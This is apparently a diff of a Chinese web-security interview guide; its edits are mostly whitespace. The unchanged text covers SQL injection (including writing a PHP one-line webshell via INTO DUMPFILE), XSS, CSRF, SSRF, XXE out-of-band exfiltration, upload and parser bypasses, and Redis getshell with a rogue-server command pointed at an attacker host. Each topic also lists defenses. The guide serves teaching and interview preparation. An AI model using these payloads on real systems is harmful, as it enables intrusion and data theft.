@@ -24,17 +24,20 @@
 **原理**：用户输入未经过滤直接拼接到 SQL 语句中执行，攻击者通过构造恶意输入改变查询逻辑，获取数据或执行系统命令。
 
 **分类（按注入点）**：
+
 1. 数字型注入：WHERE id=1，注入 `1 OR 1=1`
 2. 字符型注入：WHERE name='$input'，注入 `' OR '1'='1`
 3. 搜索型注入：LIKE '%$input%'
 
 **按数据库**：
+
 - MySQL：floor(rand()*2) / extractvalue / updatexml 报错
 - MSSQL：xp_cmdshell / OpenRowSet 堆叠
 - Oracle：ctxsys.drithsx.extractvalue / utl_inaddr 报错
 - Access：偏移注入 + 字典爆破
 
 **按数据获取方式**：
+
 - 联合注入（UNION SELECT）
 - 布尔盲注（条件真假对比页面）
 - 时间盲注（sleep / Benchmark 观察延时）
@@ -42,6 +45,7 @@
 - DNSlog 外带（load_file 外带数据）
 
 **防御（核心）**：
+
 1. 预编译参数化查询（PreparedStatement），根本解决方案
 2. PDO 绑定变量，ORM 框架安全封装
 3. 输入白名单过滤 + 正则校验
@@ -73,9 +77,11 @@
 通过 MySQL 注入点直接写入一句话木马，依赖 **5 个硬性条件缺一不可**，实战还需掌握多种绕过手段。
 
 **5 个必备条件**：
+
 1. **网站绝对路径**：通过报错信息、`phpinfo()`、读取配置文件（`my.cnf`、`httpd.conf`）、目录遍历等获取。
 2. **MySQL 用户具 FILE 权限**：`SELECT file_priv FROM mysql.user WHERE user=current_user()` 结果为 `Y`。MySQL 5.5+ 默认 root 有 FILE 权限，普通用户需显式授权。
 3. **`secure_file_priv` 配置**：
+   
    - 取值 `NULL`（MySQL 5.6+ **默认**）：**完全禁止**导入导出，写文件直接失败。
    - 取值为某具体目录（如 `/var/lib/mysql-files`）：只能向该目录写。
    - 取值为空字符串：可向任意目录写。
@@ -93,6 +99,7 @@ SELECT '<?php @eval($_POST[1]);?>' INTO DUMPFILE '/var/www/shell.php';
 ```
 
 **实战绕过手段**：
+
 - **`secure_file_priv` 受限**：改用 `general_log_file` 劫持日志写文件：
   ```sql
   SET GLOBAL general_log_file='/var/www/log.php';
@@ -109,6 +116,7 @@ SELECT '<?php @eval($_POST[1]);?>' INTO DUMPFILE '/var/www/shell.php';
 - **慢查询日志 / 二进制日志**：`SET GLOBAL slow_query_log_file='/var/www/slow.php'; SET GLOBAL slow_query_log='ON';`
 
 **outfile vs dumpfile 差异**：
+
 | 维度 | outfile | dumpfile |
 |------|---------|----------|
 | 多行内容 | 可（但会转义） | 原样 |
@@ -132,6 +140,7 @@ SELECT user();
 ```
 
 **防御组合**：
+
 - `secure_file_priv` 设为具体目录或 NULL；
 - MySQL 账户**最小权限**，禁用 FILE；
 - web 目录不可写（`chown -R root:root /var/www`）；
@@ -143,6 +152,7 @@ SELECT user();
 考察意图：实操题，面试官想听你讲清楚"为什么不能写"和"绕过的多种路径"。易错点：把 `secure_file_priv=NULL` 当作"可以写"（实际是禁止）。面试官想听到：能区分 `outfile` 与 `dumpfile`、知道 `general_log_file` 劫持日志是实战常用绕过、明白 MySQL 5.6+ 默认 `secure_file_priv=NULL` 让写文件变难、UDF 提权是替代方案。
 
 **考察知识点**：
+
 - 写文件 5 条件链：路径 + FILE 权限 + secure_file_priv + 目录可写 + 无转义
 - `outfile` vs `dumpfile` 差异
 - `secure_file_priv` 三种取值语义
@@ -250,6 +260,7 @@ AND ASCII(SUBSTR(database(),1,1))>100   -- 真/假
 配合脚本：`sqlmap -u "url?p=1" --technique=B` 或手写二分查找脚本（Python `requests` + 二分）。
 
 **效率对比**：
+
 - **报错注入**：1 次请求读全部字段（最快）
 - **DNSlog**：1 次请求 1 个字段（受域名长度 253 字符限制）
 - **时间盲注**：1 次请求 1 bit（最慢）
@@ -282,6 +293,7 @@ sqlmap -u "http://target.com/news?id=1" --tamper=space2comment,between,randomcas
 ```
 
 **防御组合**：
+
 - 关闭错误回显（生产环境 `display_errors=Off`）；
 - 数据库用户禁 FILE/Process 权限；
 - 禁止危险函数（`updatexml`、`extractvalue`、`xp_dirtree`、`UTL_HTTP`）；
@@ -292,6 +304,7 @@ sqlmap -u "http://target.com/news?id=1" --tamper=space2comment,between,randomcas
 考察意图：实操深度，区分"会用 sqlmap"和"理解原理"。回答要点：分类清晰 + 报错函数列举 + DNSlog 外带原理。易错点：把所有"盲注"统称（实际分布尔/时间/DNSlog）。面试官想听到：能列 5+ 报错函数、知道 DNSlog 跨内网外带价值、理解 `benchmark()` 替代 `sleep` 的绕过思路。
 
 **考察知识点**：
+
 - 4 类数据获取技术栈（报错/DNSlog/时间/布尔）适用场景
 - 报错注入函数族：`updatexml`/`extractvalue`/`floor`/`exp`/`convert`
 - DNSlog 外带原理与各数据库支持
@@ -328,6 +341,7 @@ print(f"[+] Final database name: {result}")
 **答案**：
 
 **类型**：
+
 1. 反射型 XSS：恶意代码在 URL 参数中，单次请求响应即触发，无持久化。攻击者诱导用户点击特制 URL。
 2. 存储型 XSS：恶意代码存入数据库（评论、用户资料等），每次访问页面自动执行，危害最大。
 3. DOM 型 XSS：完全在浏览器端通过 JS 操作 DOM 触发，不经过服务器，可能绕过服务端过滤。
@@ -335,6 +349,7 @@ print(f"[+] Final database name: {result}")
 **危害**：盗取 Cookie（document.cookie）→ 身份冒用、会话劫持；钓鱼（注入登录表单）；挂马/挖矿；键盘记录；发起内网扫描；CSRF 组合攻击。
 
 **绕过技巧（面试加分）**：
+
 - 大小写变换：`<ScRiPt>`
 - 编码绕过：HTML 实体、URL 编码、Unicode 编码
 - 标签替换：`<img onerror=>` `<svg onload=>` `<a href=javascript:>`
@@ -342,6 +357,7 @@ print(f"[+] Final database name: {result}")
 - 字符串拼接：`eval('al'+'ert(1)')`
 
 **防御（核心）**：
+
 1. 输入过滤白名单（按业务允许字符集）
 2. 输出 HTML 实体编码（`&lt; &gt; &amp; &quot;`）
 3. http-only Cookie（禁止 JS 读取 document.cookie）
@@ -374,18 +390,21 @@ print(f"[+] Final database name: {result}")
 **答案**：
 
 **原理**（Cross-Site Request Forgery 跨站请求伪造）：
+
 - 利用用户已登录身份，诱导访问恶意页面
 - 恶意页面自动向目标网站发起请求（转账、改密、关注等）
 - 浏览器自动携带目标站点的 Cookie 完成认证
 - 三要素：登录态 + 未退出 + 隐式提交
 
 **攻击载体**：
+
 - `<img src="http://bank.com/transfer?to=attacker&amount=100">`
 - `<form action="http://target" method=POST>` 自动提交
 - `<iframe src="...">` 隐藏
 - 链接诱导点击
 
 **防御（核心）**：
+
 1. Referer 检查：验证请求来源页面的 Referer 头是否合法域名（但 Referer 可被绕过或禁用）
 2. CSRF Token：在请求中携带服务端生成的随机 Token，验证 Token 一致性（最可靠）
 3. SameSite Cookie：`Set-Cookie: SameSite=Strict/Lax`，限制跨站发送 Cookie（Chrome 默认 Lax）
@@ -420,6 +439,7 @@ print(f"[+] Final database name: {result}")
 服务端可访问互联网或内网，攻击者通过构造 URL 让服务端发起请求，可突破外网隔离访问内网资源。常见触发点：图片加载、文件下载、URL 预览、远程图片采集、XML 外部实体。
 
 **利用方式**：
+
 1. **内网探测**：`http://10.0.0.1/`、`http://192.168.1.1/` 端口扫描（file_get_contents 头部响应判断）
 2. **协议利用**：
    - `file://` 读取本地文件：`file:///etc/passwd`
@@ -430,6 +450,7 @@ print(f"[+] Final database name: {result}")
 4. **DNS Rebinding**：域名第一次解析为合法 IP 通过校验，TTL 过期后再次解析为内网 IP 绕过
 
 **防御（核心）**：
+
 1. URL 白名单：仅允许访问已知域名/IP
 2. 协议限制：禁用 file / gopher / dict / ldap 等危险协议
 3. 内网 IP 过滤：禁止访问 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.0/8
@@ -463,6 +484,7 @@ print(f"[+] Final database name: {result}")
 PHP 危险函数分四类：
 
 **1. 代码执行**：
+
 - `eval()`：执行字符串作为 PHP 代码
 - `assert()`：PHP 7 前可执行字符串（已修复）
 - `preg_replace()` /e 修饰符（PHP 7 已移除）
@@ -471,6 +493,7 @@ PHP 危险函数分四类：
 - `array_map()` / `array_filter()`
 
 **2. 命令执行**：
+
 - `system()` / `exec()` / `passthru()`
 - `shell_exec()` 反引号 `` ` ``
 - `popen()` / `proc_open()`
@@ -478,15 +501,18 @@ PHP 危险函数分四类：
 - `putenv()` + `mail()` / `imagick()` LD_PRELOAD 劫持
 
 **3. 文件操作**：
+
 - `file_get_contents()` / `file_put_contents()`
 - `fopen()` / `readfile()`
 - `move_uploaded_file()`
 - `unlink()` / `fwrite()`
 
 **4. 信息泄露**：
+
 - `phpinfo()` / `print_r()` / `var_dump()` / `getenv()`
 
 **disable_functions 绕过（受限环境 getshell）**：
+
 1. **LD_PRELOAD 劫持**：`mail()` 函数 + `putenv()` 触发新进程加载自定义 .so
 2. **Apache mod_cgi bypass**：上传 `.htaccess` + 修改 CGI 执行
 3. **ImageMagick Ghostscript**：触发命令执行
@@ -495,6 +521,7 @@ PHP 危险函数分四类：
 6. **扩展 Hook**：自行编译 .so 扩展
 
 **防御**：
+
 - 禁用 eval / assert / system 等危险函数（disable_functions）
 - open_basedir 限制目录访问
 - 升级 PHP 7.4+（eval 禁用 assert 改进）
@@ -525,6 +552,7 @@ PHP 危险函数分四类：
 **漏洞原理**：服务端未严格校验上传文件的后缀、类型、内容，攻击者可上传 WebShell 获得服务器权限。
 
 **校验维度（按从弱到强）**：
+
 1. 客户端 JS 校验（最弱，可 Burp 直接改包绕过）
 2. Content-Type 校验（仅看 MIME，可改为 image/jpeg 绕过）
 3. 后缀黑名单（黑名单不全，可尝试 php3/php4/php5/phtml/phar/asa/cer/cdx 等）
@@ -533,11 +561,13 @@ PHP 危险函数分四类：
 6. 文件内容二次渲染（图片处理后仍含 shell 代码）
 
 **经典绕过手法**：
+
 1. 大小写变换：`shell.PhP`
 2. 双写后缀：`shell.pphphp`（过滤 php 为空）
 3. 文件名+特殊字符：`shell.php%00.jpg`（空字节截断）
 4. 图片头+PHP：`GIF89a<?php phpinfo();?>`
 5. **解析漏洞**：
+   
    - IIS 6.0：`shell.asp;.jpg`（;.jpg 被忽略）
    - Apache 多后缀：`shell.php.xxx` 按最后未识别后缀解析
    - Nginx 空字节：`shell.jpg%00.php`（CVE-2013-4547）
@@ -545,6 +575,7 @@ PHP 危险函数分四类：
 7. 压缩包解压：上传 zip 服务端解压触发
 
 **防御（必须全栈）**：
+
 1. 白名单后缀（仅 jpg/png/gif）
 2. 校验 Content-Type 与文件头 magic
 3. 文件重命名为随机名 + 失去原始后缀
@@ -575,6 +606,7 @@ PHP 危险函数分四类：
 Web 容器解析漏洞的**本质**是"解析器对路径/后缀的处理规则"与应用程序预期不符，常见三大容器（IIS / Apache / Nginx）都有历史经典漏洞。
 
 **IIS 6.0 解析漏洞**（已停产，但仍有 Windows Server 2003 在用）：
+
 - **`*.asp;*.jpg` 按 asp 解析**：
   - 上传 `shell.asp;.jpg`，IIS 当作 asp 执行（`;.jpg` 被忽略）。
   - 利用条件：网站开启了可执行权限。
@@ -584,30 +616,41 @@ Web 容器解析漏洞的**本质**是"解析器对路径/后缀的处理规则"
 - **修复**：升级到 IIS 7.5+，或关闭 WebDAV + 设置目录权限。
 
 **IIS 7.0+ 解析漏洞**：
+
 - **`shell.jpg/.php` 触发 FastCGI 解析**：
+  
   - 路径 `http://target.com/upload/shell.jpg/.php` → Nginx/IIS 7+ 通过 PATH_INFO 转发给 PHP-FPM。
   - PHP-FPM 配置 `cgi.fix_pathinfo=1` 时，把 `shell.jpg/.php` 当 PHP 文件执行。
   - 利用条件：Nginx + PHP-FPM + `cgi.fix_pathinfo=1`。
+
 - **修复**：在 `php.ini` 中设 `cgi.fix_pathinfo=0`。
 
 **Apache 解析漏洞**：
+
 - **多后缀从右往左认**：
+
   - Apache 配置 `AddHandler application/x-httpd-php .php` 后，文件 `x.php.xxx` 若 `.xxx` 未注册，按 `.php` 解析。
   - 利用条件：`AddHandler` 配置 + 任意未识别后缀。
+
 - **`.htaccess` 解析**：
+  
   - 上传 `.htaccess` 内容 `AddType application/x-httpd-php .jpg` → 同目录 jpg 按 PHP 解析。
   - 利用条件：`AllowOverride All` 配置 + 目录可写。
+
 - **修复**：升级 Apache + 关闭 `AllowOverride All` 或限制 `AllowOverride` 为 `None`。
 
 **Nginx 解析漏洞**：
+
 - **空字节截断**（CVE-2013-4547）：
   - 上传 `shell.jpg%00.php`，Nginx 在某些版本下识别为 `shell.jpg` 但 PHP-FPM 按 `shell.php` 解析。
   - 影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7。
 - **修复**：升级 Nginx 到 1.4.4+ 或 1.5.8+，关闭 `cgi.fix_pathinfo`。
 - **PATH_INFO 解析**：
+
   - `http://target.com/upload/shell.jpg/.php`（同 IIS 7.0+）。
 
 **Tomcat 解析漏洞**：
+
 - **PUT 上传**（CVE-2017-12615）：
   - Tomcat 启动时若 `readonly=false`（默认 web.xml 是 true，需修改 conf/web.xml）。
   - 支持 PUT 方法直接上传 JSP：`PUT /shell.jsp/ HTTP/1.1`（带 `/` 绕过）。
@@ -619,16 +662,19 @@ Web 容器解析漏洞的**本质**是"解析器对路径/后缀的处理规则"
 - **修复**：关闭 AJP Connector（注释 server.xml 中 AJP 配置）或升级 Tomcat 8.5.51+。
 
 **PHP-FPM 解析漏洞**：
+
 - **`cgi.fix_pathinfo=1` 时**（默认）：
   - 访问 `http://target.com/upload/shell.jpg/anything.php`。
   - PHP-FPM 把 `shell.jpg/anything.php` 当 PHP 执行（实际执行 `shell.jpg`）。
 - **修复**：在 `php.ini` 中设 `cgi.fix_pathinfo=0`，并升级到 PHP 7.0+。
 
 **实战组合**：
+
 - **Nginx + PHP-FPM + Tomcat + IIS 6.0** 各有不同解析漏洞，结合上传 + 解析可达 RCE。
 - **绕过现代 WAF**：用 `shell.jpg%20.php`（空格截断，部分版本有效）或 `shell.php/../../shell.jpg`。
 
 **修复清单**（黄金组合）：
+
 1. 关闭 `cgi.fix_pathinfo`（PHP）。
 2. 升级所有中间件到最新稳定版。
 3. Apache 关闭 `AllowOverride All`。
@@ -642,6 +688,7 @@ Web 容器解析漏洞的**本质**是"解析器对路径/后缀的处理规则"
 考察意图：考察 Web 容器原理与历史漏洞。回答要点：分类列各容器漏洞 + 触发条件 + 修复。易错点：只记"Apache 多后缀"忽略其他。面试官想听到：能讲清 IIS 6 `;.jpg` 原理、Nginx 空字节 CVE 编号、Tomcat AJP 文件读取 GhostCat 漏洞。
 
 **考察知识点**：
+
 - IIS 6 `*.asp;*.jpg` 和目录解析
 - Apache 多后缀 + `.htaccess`
 - Nginx 空字节 CVE-2013-4547
@@ -701,6 +748,7 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 ```
 
 **漏洞类型**：
+
 1. 直接回显 XXE：服务端返回实体内容直接可见
 2. 盲 XXE：无回显，通过外带（OOB）技术探测：
    ```xml
@@ -712,12 +760,14 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 4. DOS 攻击：嵌套亿级实体（Billion Laughs）
 
 **常见触发点**：
+
 - XML API 接口（SOAP/REST 接受 XML）
 - Office 文档解析（DOCX/XLSX 本质是 XML）
 - SVG 图片解析
 - RSS/Atom feed
 
 **防御（核心）**：
+
 1. 禁用外部实体加载：
    - PHP：`libxml_disable_entity_loader(true)`
    - Java：`DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
@@ -752,6 +802,7 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 反序列化漏洞（Insecure Deserialization）：程序将不可信数据反序列化为对象时，攻击者构造恶意序列化数据触发魔术方法执行危险操作。
 
 **PHP 反序列化**：
+
 - `unserialize($_POST)` 处理用户输入
 - 魔术方法：`__wakeup()`、`__destruct()`、`__toString()`、`__call()`
 - POP 链（Property-Oriented Programming）构造：从入口魔术方法到危险函数的调用链
@@ -759,6 +810,7 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 - 绕过技巧：CVE-2016-7124 wakeup 绕过（属性数量大于实际）、引用、GC 回收
 
 **Java 反序列化**：
+
 - `ObjectInputStream.readObject()` 处理用户输入
 - 关键 gadget：Apache Commons Collections（InvokerTransformer 链）、Spring、Groovy 等
 - 工具：ysoserial 生成 payload、marshalsec
@@ -770,6 +822,7 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 ```
 
 **修复**：
+
 1. 禁止反序列化不可信数据
 2. 白名单限制可反序列化的类（Java ObjectInputFilter）
 3. 升级库版本（commons-collections 4.0+）
@@ -801,11 +854,13 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 逻辑漏洞是业务流程设计缺陷，自动化扫描难以发现，价值极高：
 
 **1. 越权访问**：
+
 - 水平越权：同级用户 A 可访问用户 B 的数据（修改 ID 参数）
 - 垂直越权：普通用户访问管理功能（修改 URL 路径）
 - 防御：服务端鉴权 + 对象级 ACL
 
 **2. 支付逻辑**：
+
 - 金额篡改（-1 元 / 0.01 元）
 - 数量负数（-1 件商品退款获积分）
 - 优惠券 / 积分并发使用
@@ -813,28 +868,33 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 - 防御：服务端校验 + 签名 + 事务一致性
 
 **3. 验证码绕过**：
+
 - 验证码不失效可重复使用
 - 验证码回显前端
 - 验证码识别（OCR / 打码平台）
 - 防御：一次一用 + 后端校验 + 复杂度
 
 **4. 短信 / 邮箱轰炸**：
+
 - 缺少频次限制
 - 短信炸弹（每分钟 100 条）
 - 防御：频次限制 + 图形验证码 + IP 限制
 
 **5. 密码找回缺陷**：
+
 - 验证码可爆破（4 位数字）
 - 找回链接可预测（userid + timestamp）
 - 跳过验证步骤直接重置
 - 防御：随机 token + 一次性 + 有效期
 
 **6. 条件竞争**：
+
 - 余额扣减并发漏洞
 - 抢购超卖
 - 防御：事务 + 锁 + 乐观锁
 
 **7. 未授权访问**：
+
 - 后台管理路径无认证
 - 内部接口暴露公网
 - 防御：身份认证 + ACL
@@ -865,6 +925,7 @@ XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 
 **典型未授权场景**：
 
 **1. NoSQL/缓存/搜索引擎**（公网暴露最常见）：
+
 | 服务 | 默认端口 | 利用方式 |
 |------|---------|---------|
 | Redis | 6379 | 写 webshell（`config set dir` + `save`）、SSH 公钥、crontab、DLL/.so 加载 |
@@ -908,6 +969,7 @@ python redis-rogue-server.py --rhost target --lhost attacker
 ```
 
 **2. 任意文件读取 / 下载**：
+
 - **路径遍历**：`download?file=../../etc/passwd`
 - **常见绕过**：
   - `../../../etc/passwd`
@@ -925,11 +987,13 @@ python redis-rogue-server.py --rhost target --lhost attacker
   - 日志文件：`/var/log/auth.log`、`/var/log/nginx/access.log`
 
 **3. 后台/API 仅靠 URL 隐藏**：
+
 - `/admin/`、`/manage/`、`/backend/`、`/console/`
 - 默认账号：admin/admin、admin/password、root/root
 - 弱口令爆破（hydra、medusa）
 
 **4. API 端点未鉴权**：
+
 - `/api/v1/users/{id}`（无 token 校验 → IDOR）
 - `/api/swagger.json`（Swagger UI 暴露全 API）
 - GraphQL endpoint（`/graphql` 内省查询）
@@ -937,21 +1001,25 @@ python redis-rogue-server.py --rhost target --lhost attacker
 **修复策略**：
 
 **网络层**：
+
 - 服务监听内网或 127.0.0.1（Redis、MongoDB、ES 等）
 - 云安全组/防火墙限制源 IP
 - VPN/堡垒机访问管理后台
 
 **认证层**：
+
 - 所有服务强制认证（Redis `requirepass`、ES `xpack.security.enabled`）
 - 应用后台强制鉴权（Spring Security、Shiro、Oauth2）
 - API 网关（Kong、APISIX）+ JWT/OAuth2 鉴权
 
 **代码层**：
+
 - 文件路径用 ID 映射（数据库存 ID → 服务端映射真实路径）
 - 路径白名单校验（拒绝 `..`、绝对路径、空字节）
 - Web 框架封装（如 Spring `Resource` 类）
 
 **关闭不必要的**：
+
 - 删除示例应用（Tomcat examples、phpinfo）
 - 关闭目录浏览（`autoindex off`）
 - 关闭 Swagger 在生产环境
@@ -961,6 +1029,7 @@ python redis-rogue-server.py --rhost target --lhost attacker
 考察意图：考察企业真实漏洞 + 修复方案。回答要点：分类列典型场景 + 至少 2 种利用方法 + 修复组合。易错点：只说"改密码"。面试官想听到：能讲清 Redis getshell 三种姿势（webshell/SSH/cron）、知道 Elasticsearch 默认无认证、明白服务监听内网 + 强制认证是双保险。
 
 **考察知识点**：
+
 - Redis 未授权 getshell（web/SSH/cron 三种）
 - 路径遍历绕过（多重编码/UTF-8/双写）
 - Spring Boot Actuator 泄露（/env /heapdump /trace）
